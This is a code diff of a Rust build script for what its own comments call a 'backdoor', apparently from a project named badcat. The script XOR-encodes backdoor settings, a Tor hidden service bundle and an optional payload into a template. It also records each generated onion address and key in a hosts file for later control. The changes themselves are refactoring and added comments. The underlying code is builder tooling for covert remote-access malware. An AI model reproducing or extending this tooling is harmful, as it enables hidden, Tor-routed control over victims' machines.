@@ -1,6 +1,6 @@
 use std::io::Read;
 use std::path::{Path, PathBuf};
-use std::{collections, env, error, fs, process};
+use std::{collections, env, error, io, fs, process};
 
 use badcat_lib::{secrets, xor};
 use json::JsonValue;
@@ -45,6 +45,7 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     let raw_settings: JsonValue = load_settings()?;
 
     let setting = parse_settings(&raw_settings);
+
     println!("cargo:rerun-if-changed={}", CFG_SETTINGS);
     println!("cargo:rerun-if-changed={}", setting.torrc_file.to_str().unwrap());
 
@@ -55,7 +56,7 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     let mut replacements = collections::HashMap::new();
 
     replacements.insert("@{ENC_KEY}", setting.key.clone());
-    replacements.insert("@{ENC_DATA}", encode_data(&setting)?);
+    replacements.insert("@{ENC_DATA}", encode_data(&setting));
     replacements.insert("@{ENC_BUNDLE}", encode_bundle(&setting)?);
     replacements.insert("@{ENC_PAYLOAD}", encode_payload(&setting)?);
 
@@ -64,6 +65,7 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
 
+/// Generate a tar archive with hidden service information and encode with XOR
 fn encode_bundle(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
     let dir = tempfile::tempdir()?;
 
@@ -84,20 +86,14 @@ fn encode_bundle(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>
     Ok(enc_bundle)
 }
 
-fn encode_data(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
+/// Create a json object with settings for the backdoor and encode with XOR
+fn encode_data(setting: &BuildSetting) -> String {
     let mut data = JsonValue::new_object();
 
     data["uses_payload"] = setting.uses_payload.into();
     data["payload_port"] = setting.payload_port.clone().into();
 
     let mut torrc = fs::read_to_string(&setting.torrc_file).expect("problem reading torrc file");
-
-    if !setting.is_tor_for_windows {
-        torrc += r#"
-ControlSocketsGroupWritable 1
-ControlSocket @{CTRL_SOCKET}
-"#;
-    }
 
     if setting.uses_payload {
         // add a hidden service for the payload
@@ -110,12 +106,11 @@ ControlSocket @{CTRL_SOCKET}
     data["tor_dir"] = setting.spoof_dir.clone().into();
     data["torrc"] = torrc.into();
 
-    let enc_data = xor::encode(&setting.key, &json::stringify(data));
-
-    Ok(enc_data)
+    xor::encode(&setting.key, &json::stringify(data))
 }
 
-fn encode_payload(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
+/// Read the payload file and encode with XOR 
+fn encode_payload(setting: &BuildSetting) -> io::Result<String> {
     let payload = if setting.uses_payload {
         let mut file = fs::File::open(&setting.payload_file).expect("problem reading payload file");
 
@@ -127,11 +122,10 @@ fn encode_payload(setting: &BuildSetting) -> Result<String, Box<dyn error::Error
         Vec::new()
     };
 
-    let enc_data = xor::encode_bytes(&setting.key, &payload);
-
-    Ok(enc_data)
+    Ok(xor::encode_bytes(&setting.key, &payload))
 }
 
+/// Add address to hosts file.
 fn add_host(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error::Error>> {
     let mut hosts = match fs::read_to_string(&setting.hosts_file) {
         Ok(data) => json::parse(&data).expect(&format!(
@@ -145,15 +139,19 @@ fn add_host(address: String, setting: &BuildSetting) -> Result<(), Box<dyn error
 
     host["address"] = address.into();
     host["uses_payload"] = setting.uses_payload.into();
+    host["payload_port"] = setting.payload_port.clone().into();
     host["name"] = setting.name.clone().into();
     host["key"] = setting.key.clone().into();
 
     hosts.push(host)?;
+
     fs::write(&setting.hosts_file, hosts.pretty(4))?;
 
     Ok(())
 }
 
+/// Generate the Tor Hidden Service information into `to_dir` directory
+/// and return the generated hostname. 
 fn generate_hs_secrets(to_dir: &Path) -> Result<String, Box<dyn error::Error>> {
     let temp_dir = tempfile::tempdir()?;
 
@@ -192,25 +190,25 @@ fn generate_hs_secrets(to_dir: &Path) -> Result<String, Box<dyn error::Error>> {
     Ok(String::from(hs_addr))
 }
 
-fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
+/// Read the default settings file and parse into a json object.
+fn load_settings() -> json::Result<json::JsonValue> {
     let source = fs::read_to_string(CFG_SETTINGS).expect("failed to read settings");
-    Ok(json::parse(&source)?)
+    json::parse(&source)
 }
 
+/// Replace every ocorrence from `template` into `destination`. 
 fn replace_settings(
     template: &str,
-    destinaion: &str,
+    destination: &str,
     replacements: &collections::HashMap<&str, String>,
-) -> Result<(), Box<dyn error::Error>> {
+) -> io::Result<()> {
     let mut config_source = fs::read_to_string(template)?;
 
     for (pattern, content) in replacements {
         config_source = config_source.replace(pattern, &content);
     }
 
-    fs::write(destinaion, config_source)?;
-
-    Ok(())
+    fs::write(destination, config_source)
 }
 
 fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
